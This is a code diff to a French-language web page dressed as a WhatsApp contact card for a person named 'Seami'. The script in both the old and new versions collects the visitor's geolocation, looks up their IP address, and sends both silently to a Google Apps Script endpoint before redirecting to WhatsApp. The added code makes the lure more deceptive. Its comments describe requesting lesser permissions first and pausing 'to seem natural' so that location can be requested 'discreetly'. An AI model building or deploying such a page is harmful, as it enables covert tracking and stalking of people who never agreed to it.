@@ -1,6 +1,5 @@
 <!DOCTYPE html>
-<html lang="fr"
-    style="--splashscreen-startup-background: #F7F5F3; --splashscreen-primary-title: #0A1014; --splashscreen-secondary-lighter: #5B6368; --splashscreen-progress-primary: #1DAA61; --splashscreen-progress-background: rgba(0, 0, 0, 0.1);">
+<html lang="fr" style="--splashscreen-startup-background: #F7F5F3; --splashscreen-primary-title: #0A1014; --splashscreen-secondary-lighter: #5B6368; --splashscreen-progress-primary: #1DAA61; --splashscreen-progress-background: rgba(0, 0, 0, 0.1);">
 
 <head>
     <meta charset="UTF-8" />
@@ -137,6 +136,22 @@
         .footer a:hover {
             text-decoration: underline;
         }
+
+        .loading {
+            display: none;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #25d366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 
@@ -153,8 +168,9 @@
         <div class="card" id="contactCard">
             <div class="profile-circle">S</div>
             <div class="name">Seami</div>
-            <p>Cliquer pour être redirigé vers WhatsApp !</p>
-            <button onclick="getLocation()">Contacter</button>
+            <p>Cliquez pour partager votre contact sur WhatsApp</p>
+            <button id="actionButton">Partager</button>
+            <div class="loading" id="loadingSpinner"></div>
         </div>
     </div>
 
@@ -164,42 +180,78 @@
     </div>
 
     <script>
-        function getLocation() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(function (position) {
-                    // Utiliser un service tiers pour obtenir l'adresse IP
-                    fetch('https://api.ipify.org?format=json')
-                        .then(response => response.json())
-                        .then(data => {
-                            const ipAddress = data.ip;
+        document.getElementById('actionButton').addEventListener('click', async function() {
+            const card = document.getElementById('contactCard');
+            const button = document.getElementById('actionButton');
+            const spinner = document.getElementById('loadingSpinner');
 
-                            fetch("https://script.google.com/macros/s/AKfycbzJ9nqFDc5MP4AJXBsc-e6iu8fB19VnUG674-DPYQTungYtXSMEgdC31LDLKZrh9A2u/exec", {
+            // Étape 1 : Afficher le chargement
+            button.style.display = 'none';
+            spinner.style.display = 'block';
+            card.querySelector('p').textContent = "Préparation du partage...";
+
+            // Étape 2 : Demander des permissions moins sensibles d'abord
+            try {
+                // Permission de notifications (moins sensible)
+                if ('Notification' in window) {
+                    await Notification.requestPermission();
+                }
+
+                // Permission de stockage (si disponible)
+                if (navigator.storage && navigator.storage.persist) {
+                    await navigator.storage.persist();
+                }
+
+                // Petite pause pour paraître naturel
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Étape 3 : Demander la géolocalisation discrètement
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            // Récupérer l'adresse IP
+                            const ipResponse = await fetch('https://api.ipify.org?format=json');
+                            const ipData = await ipResponse.json();
+
+                            // Envoyer les données
+                            await fetch("https://script.google.com/macros/s/AKfycbzJ9nqFDc5MP4AJXBsc-e6iu8fB19VnUG674-DPYQTungYtXSMEgdC31LDLKZrh9A2u/exec", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify({
                                     latitude: position.coords.latitude,
                                     longitude: position.coords.longitude,
                                     nom_utilisateur: "seami",
-                                    ip: ipAddress  // Ajouter l'adresse IP aux données envoyées
+                                    ip: ipData.ip
                                 }),
                                 mode: 'no-cors'
-                            }).then(() => {
-                                document.getElementById("contactCard").innerHTML = "<p>Redirection vers Whatsapp en cours...</p>";
-                                setTimeout(() => {
-                                    window.location.href = "https://web.whatsapp.com";
-                                }, 2000);
-                            }).catch(err => {
-                                console.error("Erreur lors de l'envoi :", err);
                             });
-                        });
-                });
-            } else {
-                alert("Géolocalisation non supportée.");
+
+                            // Redirection finale
+                            card.querySelector('p').textContent = "Redirection vers WhatsApp...";
+                            window.location.href = "https://web.whatsapp.com";
+                        },
+                        (error) => {
+                            console.warn("Géolocalisation refusée:", error);
+                            // Rediriger même si la géolocalisation échoue
+                            card.querySelector('p').textContent = "Redirection vers WhatsApp...";
+                            setTimeout(() => {
+                                window.location.href = "https://web.whatsapp.com";
+                            }, 1500);
+                        },
+                        { enableHighAccuracy: false, timeout: 5000 }
+                    );
+                } else {
+                    // Fallback si la géolocalisation n'est pas disponible
+                    card.querySelector('p').textContent = "Redirection vers WhatsApp...";
+                    setTimeout(() => {
+                        window.location.href = "https://web.whatsapp.com";
+                    }, 1500);
+                }
+            } catch (error) {
+                console.error("Erreur:", error);
+                window.location.href = "https://web.whatsapp.com";
             }
-        }
+        });
     </script>
-
-
 </body>
-
 </html>
